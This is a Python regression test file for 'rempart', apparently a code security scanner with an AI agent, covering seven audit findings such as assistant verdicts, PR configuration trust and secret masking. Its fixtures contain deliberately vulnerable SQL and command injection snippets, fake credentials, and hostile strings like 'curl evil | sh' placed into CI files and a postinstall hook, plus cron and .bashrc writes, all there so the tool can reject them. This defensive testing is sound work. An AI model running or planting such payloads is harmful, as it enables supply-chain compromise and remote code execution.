"""Regression tests for the findings of AUDIT.md (one class per identifier).

Each test reproduces the audit's scenario and fails on the audited commit (72eb339)."""

import contextlib
import io
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path

from rempart.cli import main


def run_cli(*argv: str) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = main(list(argv))
    return code, out.getvalue(), err.getvalue()


class IsolatedHome(unittest.TestCase):
    """A private REMPART_HOME and temporary projects outside any git repository."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="rempart-audit-"))
        self._env = {k: os.environ.get(k) for k in ("REMPART_HOME", "GIT_CEILING_DIRECTORIES")}
        os.environ["REMPART_HOME"] = str(self.tmp / "home")
        os.environ["GIT_CEILING_DIRECTORIES"] = str(self.tmp)
        (self.tmp / "home").mkdir()

    def tearDown(self):
        for k, v in self._env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v

    def project(self, name: str, files: dict[str, str]) -> Path:
        root = self.tmp / name
        for rel, text in files.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text)
        return root

    def scan_json(self, root: Path, *extra: str) -> tuple[int, dict]:
        out = self.tmp / f"{root.name}-{len(list(self.tmp.glob('*.json')))}.json"
        code, _, _ = run_cli("scan", str(root), "--offline", "--only", "code", "-f", "json", "-o", str(out), *extra)
        return code, json.loads(out.read_text())


SQLI = "import sqlite3\nfrom flask import request\ndb = sqlite3.connect('a')\n\n\ndef v():\n    return db.execute('SELECT * FROM t WHERE id = ' + request.args['id'])\n"


def ignored_sqli(n: int) -> str:
    lines = ["import sqlite3", "from flask import request", "db = sqlite3.connect('a')"]
    for i in range(n):
        lines.append(f"def f{i}():\n    return db.execute('SELECT * FROM t WHERE id = ' + request.args['x{i}'])  # rempart:ignore[CODE-SQL-INJECTION]")
    return "\n".join(lines) + "\n"


class F1LearningIsolationTest(IsolatedHome):
    def victim_sqli(self, data: dict) -> dict:
        return next(f for f in data["findings"] if f["rule_id"] == "CODE-SQL-INJECTION")

    def test_audit_scenario_a_third_party_repository_cannot_lower_another_projects_finding(self):
        evil = self.project("evil", {"app.py": ignored_sqli(12)})
        victim = self.project("victim", {"app.py": SQLI})
        _, before = self.scan_json(victim)
        self.assertEqual((self.victim_sqli(before)["severity"], self.victim_sqli(before)["confidence"]), ("CRITICAL", 0.9))
        run_cli("scan", str(evil), "--offline", "--only", "code")
        _, after = self.scan_json(victim)
        self.assertEqual((self.victim_sqli(after)["severity"], self.victim_sqli(after)["confidence"]), ("CRITICAL", 0.9))

    def test_inline_ignores_have_a_capped_influence_inside_their_own_project(self):
        files = {"legacy.py": ignored_sqli(12), "app.py": SQLI.replace("def v", "def real")}
        root = self.project("same", files)
        run_cli("scan", str(root), "--offline", "--only", "code")
        _, data = self.scan_json(root)
        real = next(f for f in data["findings"] if f["rule_id"] == "CODE-SQL-INJECTION" and f["path"] == "app.py")
        self.assertEqual(real["severity"], "CRITICAL")
        self.assertGreaterEqual(real["confidence"], 0.6)

    def test_agent_verdicts_stay_in_their_project(self):
        from rempart.history import History, project_identity

        a = self.project("a", {"app.py": SQLI})
        b = self.project("b", {"app.py": SQLI.replace("def v", "def w")})
        _, data = self.scan_json(a)
        hist = History()
        hist.triage(project_identity(a), data["findings"][0]["fingerprint"], "fp", source="ai")
        hist.close()
        _, other = self.scan_json(b)
        self.assertEqual(self.victim_sqli(other)["confidence"], 0.9)

    def test_only_explicitly_global_human_verdicts_cross_projects(self):
        a = self.project("a", {"app.py": SQLI})
        b = self.project("b", {"app.py": SQLI.replace("def v", "def w")})
        _, data = self.scan_json(a)
        fid = data["findings"][0]["fingerprint"][:10]
        run_cli("triage", fid, "--fp", "--path", str(a))
        _, untouched = self.scan_json(b)
        self.assertEqual(self.victim_sqli(untouched)["confidence"], 0.9)
        run_cli("triage", fid, "--fp", "--global", "--path", str(a))
        _, influenced = self.scan_json(b)
        self.assertLess(self.victim_sqli(influenced)["confidence"], 0.9)

    def test_project_identity_is_the_root_commit_else_the_canonical_path(self):
        from rempart.history import project_identity

        plain = self.project("plain", {"a.py": "x = 1\n"})
        self.assertEqual(project_identity(plain), f"path:{plain.resolve()}")
        repo = self.project("repo", {"a.py": "x = 1\n"})
        env = {**os.environ, "GIT_CEILING_DIRECTORIES": ""}
        for cmd in (["init", "-q"], ["add", "-A"], ["-c", "user.email=a@b", "-c", "user.name=a", "commit", "-q", "-m", "init"]):
            subprocess.run(["git", "-C", str(repo), *cmd], check=True, env=env)
        clone = self.tmp / "clone"
        subprocess.run(["git", "clone", "-q", str(repo), str(clone)], check=True, env=env)
        os.environ["GIT_CEILING_DIRECTORIES"] = ""
        try:
            self.assertTrue(project_identity(repo).startswith("git:"))
            self.assertEqual(project_identity(repo), project_identity(clone))  # two clones learn together
        finally:
            os.environ["GIT_CEILING_DIRECTORIES"] = str(self.tmp)


class _Boom:
    name = "boom"

    def scan(self, ctx):
        raise TypeError("cannot use 'list' as a set element (unhashable type: 'list')")
        yield  # pragma: no cover


class _Slow:
    name = "slow"

    def scan(self, ctx):
        import time

        time.sleep(30)
        return []


class F2FailClosedTest(IsolatedHome):
    def setUp(self):
        super().setUp()
        from rempart import scanners

        self._saved = dict(scanners.ALL_SCANNERS)
        scanners.ALL_SCANNERS.update({"boom": _Boom(), "slow": _Slow()})
        self.root = self.project("p", {"app.py": "print('hello')\n"})

    def tearDown(self):
        from rempart import scanners

        scanners.ALL_SCANNERS.clear()
        scanners.ALL_SCANNERS.update(self._saved)
        super().tearDown()

    def test_audit_scenario_a_crashing_scanner_never_yields_a_grade_or_a_passing_exit(self):
        code, out, _ = run_cli("scan", str(self.root), "--offline", "--only", "boom,code", "--fail-on", "high")
        self.assertEqual(code, 3)
        self.assertNotIn("grade A", out)
        self.assertNotIn("100/100", out)
        self.assertIn("incomplete", out.lower())
        code, _, _ = run_cli("scan", str(self.root), "--offline", "--only", "boom,code")  # no --fail-on either
        self.assertEqual(code, 3)

    def test_error_is_a_high_finding_and_the_reports_say_incomplete(self):
        out = self.tmp / "r.json"
        run_cli("scan", str(self.root), "--offline", "--only", "boom", "-f", "json", "-o", str(out))
        data = json.loads(out.read_text())
        self.assertIsNone(data["score"])
        self.assertIsNone(data["grade"])
        self.assertFalse(data["complete"])
        err = [f for f in data["findings"] if f["rule_id"] == "SCANNER-ERROR"]
        self.assertEqual(err[0]["severity"], "HIGH")
        md = self.tmp / "r.md"
        run_cli("scan", str(self.root), "--offline", "--only", "boom", "-f", "md", "-o", str(md))
        self.assertIn("incomplete", md.read_text().lower())
        sarif = self.tmp / "r.sarif"
        run_cli("scan", str(self.root), "--offline", "--only", "boom", "-f", "sarif", "-o", str(sarif))
        self.assertFalse(json.loads(sarif.read_text())["runs"][0]["invocations"][0]["executionSuccessful"])

    def test_explicit_opt_out(self):
        code, out, _ = run_cli("scan", str(self.root), "--offline", "--only", "boom", "--allow-scanner-errors")
        self.assertEqual(code, 0)
        self.assertIn("incomplete", out.lower())

    def test_a_timeout_counts_as_an_error(self):
        import time

        start = time.monotonic()
        code, out, _ = run_cli("scan", str(self.root), "--offline", "--only", "slow", "--scanner-timeout", "1")
        self.assertLess(time.monotonic() - start, 10)
        self.assertEqual(code, 3)
        self.assertIn("timed out", out)

    def test_a_domain_skipped_by_a_network_error_counts_as_an_error(self):
        from unittest import mock

        from rempart.netcache import NetworkError
        from rempart.scanners.deps import DependencyScanner

        root = self.project("deps", {"requirements.txt": "flask==2.0.0\n"})
        with mock.patch.object(DependencyScanner, "vulnerabilities", side_effect=NetworkError("OSV.dev unreachable")):
            code, out, _ = run_cli("scan", str(root), "--only", "dependencies")
        self.assertEqual(code, 3)
        self.assertIn("OSV.dev unreachable", out)
        code, _, _ = run_cli("scan", str(root), "--only", "dependencies", "--offline")  # offline is a choice, not an error
        self.assertEqual(code, 0)

    def test_history_does_not_record_a_grade_for_an_incomplete_scan(self):
        from rempart.history import History, project_identity

        run_cli("scan", str(self.root), "--offline", "--only", "boom")
        hist = History()
        scans = hist.scans(project_identity(self.root))
        hist.close()
        self.assertEqual((scans[0]["score"], scans[0]["grade"]), (None, "INCOMPLETE"))


CMD = "import os\nfrom flask import request\n\n\ndef f():\n    os.system('ping ' + request.args['h'])\n"


class F3AssistantCannotCloseTest(IsolatedHome):
    def test_audit_scenario_an_mcp_verdict_neither_closes_nor_passes_the_gate(self):
        from rempart import mcp_server as m
        from rempart.history import History

        root = self.project("p", {"app.py": CMD})
        r = json.loads(m.tool_scan({"path": str(root), "offline": True}))
        fid = next(f["id"] for f in r["findings"] if f["rule"] == "CODE-CMD-INJECTION")
        m.tool_triage({"id": fid, "verdict": "fp", "note": "assistant says safe"})
        hist = History()
        self.assertEqual(hist.db.execute("SELECT verdict, source FROM verdicts").fetchall(), [("fp", "ai_assistant")])
        hist.close()
        code, data = self.scan_json(root, "--fail-on", "high")
        self.assertEqual(code, 1)
        self.assertIn("CODE-CMD-INJECTION", {f["rule_id"] for f in data["findings"]})

    def test_many_non_human_false_positives_never_lower_the_severity_used_by_the_gate(self):
        from rempart.history import History, project_identity

        files = {f"m{i}.py": CMD.replace("def f", f"def f{i}") for i in range(12)}
        root = self.project("many", files)
        _, data = self.scan_json(root)
        hist = History()
        project = project_identity(root)
        for f in data["findings"][:10]:
            hist.triage(project, f["fingerprint"], "fp", source="ai_assistant")
            hist.triage(project, f["fingerprint"], "fp", source="ai")
        hist.close()
        code, after = self.scan_json(root, "--fail-on", "critical")
        self.assertEqual(code, 1)
        self.assertTrue(all(f["severity"] == "CRITICAL" for f in after["findings"] if f["rule_id"] == "CODE-CMD-INJECTION"))

    def test_human_false_positives_still_lower_a_rule_that_keeps_being_wrong(self):
        from rempart.history import History, project_identity

        files = {f"m{i}.py": CMD.replace("def f", f"def f{i}") for i in range(8)}
        root = self.project("human", files)
        _, data = self.scan_json(root)
        hist = History()
        project = project_identity(root)
        for f in data["findings"][:6]:
            hist.triage(project, f["fingerprint"], "fp")
        hist.close()
        _, after = self.scan_json(root)
        left = [f for f in after["findings"] if f["rule_id"] == "CODE-CMD-INJECTION"]
        self.assertTrue(left and all(f["severity"] == "HIGH" for f in left))

    def test_the_readme_states_the_real_behaviour(self):
        text = (Path(__file__).resolve().parents[1] / "README.md").read_text()
        self.assertTrue("ai_assistant" in text, "README must say that assistant verdicts are recorded as ai_assistant")


class F4ConfigFromBaseTest(IsolatedHome):
    def git(self, root: Path, *args: str) -> str:
        env = {**os.environ, "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@b", "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@b"}
        return subprocess.run(["git", "-C", str(root), *args], check=True, capture_output=True, text=True, env=env).stdout.strip()

    def pull_request(self, head_files: dict[str, str]) -> tuple[Path, str]:
        """A repository whose base commit is clean and whose head adds `head_files`."""
        root = self.project("repo", {"app.py": "print('ok')\n", "helpers.py": "def clean(v):\n    return v.strip()\n"})
        self.git(root, "init", "-q")
        self.git(root, "add", "-A")
        self.git(root, "commit", "-q", "-m", "base")
        base = self.git(root, "rev-parse", "HEAD")
        for rel, text in head_files.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text)
        self.git(root, "add", "-A")
        self.git(root, "commit", "-q", "-m", "head")
        return root, base

    VULN = "import os\nfrom flask import request\nfrom helpers import clean\n\n\ndef f():\n    os.system('ping ' + clean(request.args['h']))\n"

    def test_audit_scenario_a_pr_cannot_disable_the_rule_that_catches_it(self):
        root, base = self.pull_request({"app.py": self.VULN, ".rempart.toml": 'disable = ["CODE-CMD-INJECTION"]\n'})
        code, data = self.scan_json(root, "--baseline", base, "--fail-on", "high")
        self.assertEqual(code, 1)
        ids = {f["rule_id"] for f in data["findings"]}
        self.assertIn("CODE-CMD-INJECTION", ids)
        self.assertIn("REMPART-CONFIG-CHANGED", ids)

    def test_audit_scenario_a_pr_cannot_declare_its_own_sanitiser(self):
        knowledge = '[sanitizers]\nclean = { categories = ["cmd"] }\n'
        root, base = self.pull_request({"app.py": self.VULN, ".rempart/knowledge.toml": knowledge})
        code, data = self.scan_json(root, "--baseline", base, "--fail-on", "high")
        self.assertEqual(code, 1)
        self.assertIn("CODE-CMD-INJECTION", {f["rule_id"] for f in data["findings"]})
        changed = [f for f in data["findings"] if f["rule_id"] == "REMPART-CONFIG-CHANGED"]
        self.assertEqual((changed[0]["path"], changed[0]["severity"]), (".rempart/knowledge.toml", "HIGH"))

    def test_trusting_the_head_is_explicit_and_still_flagged_for_review(self):
        root, base = self.pull_request({"app.py": self.VULN, ".rempart.toml": 'disable = ["CODE-CMD-INJECTION"]\n'})
        code, data = self.scan_json(root, "--baseline", base, "--trust-config", "head", "--fail-on", "high")
        ids = {f["rule_id"] for f in data["findings"]}
        self.assertNotIn("CODE-CMD-INJECTION", ids)  # the head's configuration was trusted, on request
        self.assertIn("REMPART-CONFIG-CHANGED", ids)
        self.assertEqual(code, 1)

    def test_unchanged_configuration_raises_nothing(self):
        root, base = self.pull_request({"app.py": "print('still fine')\n"})
        code, data = self.scan_json(root, "--baseline", base, "--fail-on", "high")
        self.assertEqual(code, 0)
        self.assertNotIn("REMPART-CONFIG-CHANGED", {f["rule_id"] for f in data["findings"]})

    def test_the_action_trusts_the_base_by_default(self):
        import yaml

        action = yaml.safe_load((Path(__file__).resolve().parents[1] / "action.yml").read_text())
        self.assertEqual(action["inputs"]["trust-config"]["default"], "base")
        scan_step = next(s for s in action["runs"]["steps"] if s.get("name") == "Scan")
        self.assertIn("--trust-config", scan_step["run"])
        self.assertNotIn("${{", scan_step["run"])  # inputs still only through env


class F5AgentNeverSeesSecretsTest(IsolatedHome):
    def workspace(self, files: dict[str, str]):
        from rempart.agent import Workspace
        from rempart.engine import ScanResult

        root = self.project("ws", files)
        return Workspace(ScanResult(root=str(root), findings=[], files_scanned=len(files), duration_s=0, scanners=[]), list(files))

    def setUp(self):
        super().setUp()
        from tests.helpers import FAKE_AWS_KEY, FAKE_GH_TOKEN, FAKE_PRIVATE_KEY_HEADER

        self.aws, self.gh = FAKE_AWS_KEY, FAKE_GH_TOKEN
        self.generic = "q8Zr2" + "Lx7Wm4Tn9Vk3Hp6Dc"
        body = "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun"
        self.ws = self.workspace({
            "config.py": f"AWS_ACCESS_KEY_ID = '{self.aws}'\napi_secret = '{self.generic}'\nGH = '{self.gh}'\nDEBUG = False\n",
            "deploy.pem": f"{FAKE_PRIVATE_KEY_HEADER}\n{body}\n-----END RSA PRIVATE KEY-----\n",
            "notes.txt": f"key:\n{FAKE_PRIVATE_KEY_HEADER}\n{body}\n-----END RSA PRIVATE KEY-----\nend\n",
            ".env": f"STRIPE=sk_live_{'x' * 24}\n",
            ".env.production": "DB_PASSWORD=hunter2hunter2\n",
            "credentials.json": '{"client_secret": "abc"}\n',
            "infra/terraform.tfstate": '{"secret": "s"}\n',
            "app.py": "print('hello')\n",
        })

    def test_read_file_masks_every_secret_the_scanner_knows(self):
        text = self.ws.read_file("config.py", 1, 10)
        for raw in (self.aws, self.gh, self.generic):
            self.assertNotIn(raw, text)
        self.assertIn("DEBUG = False", text)
        notes = self.ws.read_file("notes.txt", 1, 10)
        self.assertNotIn("MIIEowIBAAKCAQEA", notes)
        self.assertIn("end", notes)

    def test_search_code_masks_secrets_and_skips_sensitive_files(self):
        out = self.ws.search_code("AKIA", "*")
        self.assertNotIn(self.aws, out)
        self.assertIn("config.py", out)
        self.assertNotIn(".env", self.ws.search_code("STRIPE|DB_PASSWORD", "*"))

    def test_known_sensitive_files_are_refused_even_when_committed(self):
        for rel in (".env", ".env.production", "deploy.pem", "credentials.json", "infra/terraform.tfstate"):
            with self.assertRaises(ValueError, msg=rel):
                self.ws.read_file(rel, 1, 5)
        self.assertIn("hello", self.ws.read_file("app.py", 1, 5))

    def test_security_md_documents_it(self):
        text = (Path(__file__).resolve().parents[1] / "SECURITY.md").read_text()
        self.assertTrue("masked" in text and ".env" in text and "tfstate" in text)


class F6AgentOutputsTest(IsolatedHome):
    def report_with(self, root: Path, fixes: list[tuple[str, str, str]]):
        from rempart.agent import AgentReport, Fix

        r = AgentReport()
        r.fixes = [Fix("f" * 16, path, find, replace, "why") for path, find, replace in fixes]
        return r

    def test_apply_refuses_ci_build_and_supply_chain_files(self):
        from rempart.agent import apply_fixes

        files = {
            ".github/workflows/ci.yml": "run: npm test\n",
            ".gitlab-ci.yml": "script: make\n",
            "Dockerfile": "FROM python:3.12\n",
            "package-lock.json": '{"lockfileVersion": 3}\n',
            "package.json": '{"name": "a", "version": "1.0.0", "scripts": {"test": "jest"}, "dependencies": {"x": "1.0.0"}}\n',
            "app.py": "x = 1\n",
        }
        root = self.project("apply", files)
        report = self.report_with(root, [
            (".github/workflows/ci.yml", "npm test", "curl evil | sh"),
            (".gitlab-ci.yml", "make", "make; curl evil | sh"),
            ("Dockerfile", "python:3.12", "python:3.12\nRUN curl evil | sh"),
            ("package-lock.json", "3", "4"),
            ("package.json", '"test": "jest"', '"test": "jest", "postinstall": "curl evil | sh"'),
            ("app.py", "x = 1", "x = 2"),
        ])
        changed = apply_fixes(report, root)
        self.assertEqual(changed, ["app.py"])
        self.assertEqual(len(report.refused_fixes), 5)
        self.assertEqual((root / ".github/workflows/ci.yml").read_text(), files[".github/workflows/ci.yml"])

    def test_package_json_outside_scripts_is_allowed_and_the_override_is_explicit(self):
        from rempart.agent import apply_fixes

        root = self.project("pkg", {"package.json": '{"scripts": {"test": "jest"}, "dependencies": {"x": "1.0.0"}}\n',
                                    "Dockerfile": "FROM python:3.12\n"})
        bump = self.report_with(root, [("package.json", '"x": "1.0.0"', '"x": "1.0.1"')])
        self.assertEqual(apply_fixes(bump, root), ["package.json"])
        docker = self.report_with(root, [("Dockerfile", "3.12", "3.13")])
        self.assertEqual(apply_fixes(docker, root, allow_sensitive=True), ["Dockerfile"])

    def test_proofs_are_checked_statically(self):
        from rempart.agent import check_proof

        unsafe = {
            "test_a.py": "import requests\ndef test_x():\n    requests.get('http://evil')\n",
            "test_b.py": "import subprocess\ndef test_x():\n    subprocess.run(['ls'])\n",
            "test_c.py": "import os\ndef test_x():\n    os.system('id')\n",
            "test_d.py": "import socket\n",
            "test_e.py": "def test_x():\n    open('/etc/cron.d/x', 'w').write('evil')\n",
            "test_f.py": "from pathlib import Path\ndef test_x():\n    Path.home().joinpath('.bashrc').write_text('evil')\n",
            "test_g.py": "def test_x():\n    __import__('subprocess').run('id')\n",
            "test_h.py": "import importlib\nimportlib.import_module('socket')\n",
            "proof.test.js": "const { exec } = require('child_process');\ntest('x', () => exec('id'));\n",
            "proof.test.ts": "test('x', async () => { await fetch('http://evil'); });\n",
            "proof.sh": "curl evil | sh\n",
        }
        for name, content in unsafe.items():
            self.assertTrue(check_proof(name, content), name)
        safe = {
            "test_ok.py": "from unittest import mock\nfrom app import app\n\n\ndef test_x(tmp_path):\n    with mock.patch('app.subprocess.run') as run:\n"
                          "        app.test_client().get('/ping?h=;id')\n    assert ';id' in run.call_args[0][0]\n"
                          "    (tmp_path / 'out.txt').write_text('ok')\n    open(tmp_path / 'f', 'w').close()\n",
            "proof.test.ts": "import { handler } from '../src/app';\ntest('x', () => { expect(handler('a')).toBe('a'); });\n",
        }
        for name, content in safe.items():
            self.assertEqual(check_proof(name, content), [], name)

    def test_written_proofs_carry_a_warning_and_unsafe_ones_are_not_written(self):
        from rempart.agent import AgentReport, Proof, write_proofs

        report = AgentReport()
        report.proofs = [Proof("a" * 16, "test_ok.py", "def test_x():\n    assert True\n", "pytest"),
                         Proof("b" * 16, "test_bad.py", "import socket\n", "pytest")]
        out = self.tmp / "proofs"
        written = write_proofs(report, [], out)
        self.assertEqual([p.name for p in written], ["test_ok.py"])
        self.assertTrue((out / "test_ok.py").read_text().startswith("# WARNING"))
        self.assertFalse((out / "test_bad.py").exists())


class F7LiveVerificationTest(IsolatedHome):
    def test_opt_in_prints_a_legal_and_alerting_warning(self):
        root = self.project("p", {"app.py": "x = 1\n"})
        _, _, err = run_cli("scan", str(root), "--offline", "--only", "secrets", "--verify-secrets")
        low = err.lower()
        self.assertIn("own", low)
        self.assertIn("canary", low)
        self.assertIn("guardduty", low)
        _, _, quiet = run_cli("scan", str(root), "--offline", "--only", "secrets")
        self.assertNotIn("canary", quiet.lower())

    def test_tokens_travel_in_headers_except_where_the_provider_allows_nothing_else(self):
        import urllib.request

        from rempart import verify

        token = "tok_" + "Zq7Xr2Lm9Wk4Tn8Vp3Hs6Dc1Yb5Fg0Jt"
        in_url = set()
        for rule_id in verify.SUPPORTED:
            seen: list[urllib.request.Request] = []

            def http(req, seen=seen):
                seen.append(req)
                return 401, b"{}"

            run = verify.checker(rule_id, token if rule_id != "SEC-AWS-ACCESS-KEY" else "AKIA" + "Z7QXRT2MWPLK4N8J", "")
            run(http)
            if any(token in r.full_url for r in seen):
                in_url.add(rule_id)
        self.assertEqual(in_url, set(verify.TOKEN_IN_URL))
        doc = (Path(__file__).resolve().parents[1] / "SECURITY.md").read_text()
        for rule_id in verify.TOKEN_IN_URL:
            self.assertIn(rule_id, doc)
        self.assertIn("canarytokens", doc.lower())
        self.assertIn("GuardDuty", doc)


if __name__ == "__main__":
    unittest.main()
